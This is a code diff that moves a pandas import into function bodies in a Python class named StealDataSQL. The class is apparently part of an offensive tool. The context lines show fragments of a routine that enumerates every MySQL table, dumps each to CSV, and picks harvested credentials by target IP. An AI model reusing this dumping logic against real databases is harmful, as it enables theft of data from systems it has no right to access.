@@ -1,5 +1,4 @@
 import os
-import pandas as pd
 import logging
 import time
 from sqlalchemy import create_engine
@@ -61,6 +60,7 @@ class StealDataSQL:
             WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
             AND TABLE_TYPE = 'BASE TABLE'
             """
+            import pandas as pd  # lazy: keep pandas out of module import (P2)
             df = pd.read_sql(query, engine)
             tables = df[['TABLE_NAME', 'TABLE_SCHEMA']].values.tolist()
             logger.info(f"Found {len(tables)} tables across all databases")
@@ -78,6 +78,7 @@ class StealDataSQL:
                 logger.info("Data stealing process interrupted due to orchestrator exit.")
                 return
             query = f"SELECT * FROM {schema}.{table}"
+            import pandas as pd  # lazy: keep pandas out of module import (P2)
             df = pd.read_sql(query, engine)
             local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
             df.to_csv(local_file_path, index=False)
@@ -98,6 +99,7 @@ class StealDataSQL:
                 sqlfile = self.shared_data.sqlfile
                 credentials = []
                 if os.path.exists(sqlfile):
+                    import pandas as pd  # lazy: keep pandas out of module import (P2)
                     df = pd.read_csv(sqlfile)
                     # Filtrer les credentials pour l'IP spécifique
                     ip_credentials = df[df['IP Address'] == ip]
